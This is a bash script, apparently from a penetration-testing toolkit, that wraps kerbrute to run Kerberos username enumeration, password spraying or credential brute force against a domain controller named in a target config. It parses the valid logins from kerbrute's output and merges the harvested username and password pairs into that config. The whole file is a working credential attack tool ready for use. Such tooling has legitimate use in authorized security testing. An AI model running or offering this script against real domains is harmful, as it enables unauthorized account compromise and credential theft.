#!/bin/bash

TARGET_DIR="$1"
RED='\033[0;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")

if [[ ! -f "$TARGET_DIR/target.conf" ]]; then
    echo -e "${RED}No target.conf found at $TARGET_DIR${NC}"
    exit 1
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$TARGET_DIR/target.conf"

ATTACKMODULE="kerbrute"
echo "$TIMESTAMP: Enumeration - $TARGETURL - Kerbrute" >> "$PROJECTDIR/methodology.md"

spin() {
    local estimated=$1
    local elapsed=0
    local spinstr='|/-\'
    while kill -0 $KERBRUTE_PID 2>/dev/null; do
        local temp=${spinstr#?}
        printf "\r${BLUE}[%c]${NC} Elapsed: %ds | Estimated: ~%ds " "$spinstr" "$elapsed" "$estimated"
        spinstr=$temp${spinstr%"$temp"}
        sleep 1
        ((elapsed++))
    done
    printf "\r${GREEN}[✓] Finished in %ds%-40s${NC}\n" "$elapsed" ""
}

echo -e "${BLUE}[+] Attacking with Kerbrute${NC}"
mkdir -p "${TARGETDIR}/attacks/${TIMESTAMP}_kerbrute"
THISDIR="${TARGETDIR}/attacks/${TIMESTAMP}_kerbrute"

echo "1. User Enum"
echo "2. Password Spray"
echo "3. user:pass Check"
read -p "Attack type: " ATTACKTYPE

read -p "Use safe mode (y/n; default y)? " SAFEMODE
SAFEMODE=${SAFEMODE:-y}

read -p "Thread count (default 10): " THREADS
THREADS=${THREADS:-10}

read -p "Delay (ms, default 0): " DELAY
DELAY=${DELAY:-0}

# Base flags (without the mode yet)
BASEFLAGS="-d ${TARGETURL} --dc ${DOMAINCONTROLLER} -t ${THREADS} --delay ${DELAY} -o ${THISDIR}/results.txt"

if [[ "$SAFEMODE" == "y" ]]; then
    BASEFLAGS+=" --safe"
fi

if [[ "$ATTACKTYPE" == "1" ]]; then
    read -p "User wordlist (default names.txt): " WORDLIST
    WORDLIST=${WORDLIST:-"/usr/share/seclists/Usernames/Names/names.txt"}

    TOTAL=$(wc -l < "$WORDLIST")
    if [[ "$DELAY" -gt 0 ]]; then
        ESTIMATED=$(( (TOTAL * DELAY) / 1000 + 2 ))
    else
        ESTIMATED=$(( TOTAL / 3000 + 1 ))
    fi

    echo -e "${BLUE}[+] Starting Kerbrute user enumeration (${TOTAL} usernames, ≈${ESTIMATED}s estimated)...${NC}"
    kerbrute userenum ${BASEFLAGS} "$WORDLIST" &
    KERBRUTE_PID=$!

elif [[ "$ATTACKTYPE" == "2" ]]; then
    read -p "User wordlist (default names.txt): " WORDLIST
    WORDLIST=${WORDLIST:-"/usr/share/seclists/Usernames/Names/names.txt"}
    read -p "Password to spray: " PASSWORD

    TOTAL=$(wc -l < "$WORDLIST")
    if [[ "$DELAY" -gt 0 ]]; then
        ESTIMATED=$(( (TOTAL * DELAY) / 1000 + 2 ))
    else
        ESTIMATED=$(( TOTAL / 3000 + 1 ))
    fi

    echo -e "${BLUE}[+] Starting Kerbrute password spray (${TOTAL} usernames, ≈${ESTIMATED}s estimated)...${NC}"
    kerbrute passwordspray ${BASEFLAGS} "$WORDLIST" "$PASSWORD" &
    KERBRUTE_PID=$!

else
    read -p "Combo list (user:pass format): " WORDLIST

    TOTAL=$(wc -l < "$WORDLIST")
    if [[ "$DELAY" -gt 0 ]]; then
        ESTIMATED=$(( (TOTAL * DELAY) / 1000 + 2 ))
    else
        ESTIMATED=$(( TOTAL / 3000 + 1 ))
    fi

    echo -e "${BLUE}[+] Starting Kerbrute bruteforce (${TOTAL} combinations, ≈${ESTIMATED}s estimated)...${NC}"
    kerbrute bruteforce ${BASEFLAGS} "$WORDLIST" &
    KERBRUTE_PID=$!
fi

spin $ESTIMATED
wait $KERBRUTE_PID

echo "${GREEN}=== Attack complete. Updating target.conf ===${NC}"

# --- Post-processing results ---
if [[ "$ATTACKTYPE" == "1" ]]; then
    # User enumeration → store as username:
    grep "VALID USERNAME" "${THISDIR}/results.txt" | awk '{print $NF}' | cut -d@ -f1 | sort -u | sed 's/$/:/' > "${THISDIR}/valid_creds.txt"
else
    # Password spray / bruteforce → full user:pass
    grep "VALID LOGIN" "${THISDIR}/results.txt" | awk '{print $NF}' | sort -u > "${THISDIR}/valid_creds.txt"
fi

if [[ -s "${THISDIR}/valid_creds.txt" ]]; then
    echo -e "${GREEN}[+] Updating credentials in target.conf...${NC}"

    {
        echo "#CREDS_START"

        # Keep existing entries
        if grep -q "#CREDS_START" "$TARGET_DIR/target.conf"; then
            sed -n '/#CREDS_START/,/#CREDS_END/{//!p}' "$TARGET_DIR/target.conf"
        fi

        # Add new findings
        cat "${THISDIR}/valid_creds.txt"

        echo "#CREDS_END"
    } | awk -F: '
    {
        user = $1
        pass = substr($0, index($0,$2))   # everything after the first :

        if (user == "") {
            # Pure password entry (:password)
            print ":" pass
            next
        }

        if (pass != "") {
            # Full credential - always wins
            creds[user] = user ":" pass
        } else if (!(user in creds) || creds[user] ~ /:$/) {
            # Only store username: if we do not already have a password for them
            creds[user] = user ":"
        }
    }
    END {
        for (u in creds) {
            print creds[u]
        }
    }' | sort -u > "${THISDIR}/new_creds_block.txt"

    # Remove old block if it exists
    if grep -q "#CREDS_START" "$TARGET_DIR/target.conf"; then
        sed -i '/#CREDS_START/,/#CREDS_END/d' "$TARGET_DIR/target.conf"
    fi

    # Write the new clean block
    {
        echo "#CREDS_START"
        cat "${THISDIR}/new_creds_block.txt"
        echo "#CREDS_END"
    } >> "$TARGET_DIR/target.conf"

    echo -e "${GREEN}[+] Credentials updated in target.conf${NC}"
else
    echo -e "${YELLOW}[!] No new credentials found.${NC}"
fi
